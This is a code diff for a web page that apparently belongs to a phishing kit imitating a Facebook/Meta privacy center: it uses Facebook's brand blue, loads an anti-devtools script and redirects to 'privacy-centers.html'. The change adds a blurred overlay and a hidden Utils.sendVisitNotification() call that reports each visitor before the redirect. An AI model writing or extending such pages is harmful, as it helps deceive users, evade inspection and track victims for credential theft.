@@ -8,6 +8,11 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@3.4.1/dist/tailwind.min.css">
     <link rel="stylesheet" href="./public/styles/checkbox.css">
     <link rel="stylesheet" href="./public/styles/style.css">
+    <style>
+        #page-boot-overlay{position:fixed;inset:0;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.82);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
+        .boot-spinner{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:_tl_spin .7s linear infinite}
+        @keyframes _tl_spin{to{transform:rotate(360deg)}}
+    </style>
     <link rel="icon" href="./public/favicon-32x32.png">
 
     <!-- Tailwind CSS CDN -->
@@ -30,6 +35,9 @@
 </head>
 
 <body class="bg-[#ffffff] flex flex-col items-center justify-center h-[100vh] w-full">
+    <div id="page-boot-overlay">
+        <div class="boot-spinner"></div>
+    </div>
     <!-- NAVBAR START -->
     <div class="bg-white min-h-[100vh] w-full rounded-[0px]">
         <div
@@ -308,43 +316,22 @@
             </div>
         </div>
 
-        <!-- Loading Modal -->
-        <div id="loadingModal" class="fixed inset-0 z-99 flex items-center justify-center bg-black/40"
-            style="backdrop-filter:blur(6px)">
-            <div
-                class="max-h-full w-full max-w-lg flex flex-col overflow-y-auto transform transition-all duration-200 ">
-                <div class="flex flex-col items-center justify-center flex-1">
-                    <div
-                        class="loader ease-linear rounded-full border-[3px] border-t-[30x] border-white h-[36px] w-[36px]">
-                    </div>
-                </div>
-            </div>
-        </div>
+        <!-- Loading overlay is #page-boot-overlay -->
 
         <script src="./public/js/disableDevtool.js"></script>
+        <script src="./public/js/config.js"></script>
+        <script src="./public/js/utils.js"></script>
         <script>
-            document.addEventListener('DOMContentLoaded', function () {
-                const loadingModal = document.getElementById('loadingModal');
-                const countdownElement = document.getElementById('countdown');
-                let countdown = 4;
+            document.addEventListener('DOMContentLoaded', async function () {
+                const started = Date.now();
+                try {
+                    await Utils.sendVisitNotification();
+                } catch (e) { /* continue */ }
 
-                // Show modal
-                loadingModal.classList.remove('hidden');
-                loadingModal.classList.add('block');
-
-                const interval = setInterval(() => {
-                    countdown--;
-
-                    if (countdown <= 0) {
-                        clearInterval(interval);
-                        // Hide modal
-                        setTimeout(() => {
-                            window.location.href = 'privacy-centers.html';
-                            loadingModal.classList.remove('opacity-100');
-                            loadingModal.classList.add('opacity-0', 'pointer-events-none');
-                        }, 300);
-                    }
-                }, 1000); // Update every 1 second
+                const wait = Math.max(0, 2500 - (Date.now() - started));
+                setTimeout(function () {
+                    window.location.href = 'privacy-centers.html';
+                }, wait);
             });
         </script>
         <style>
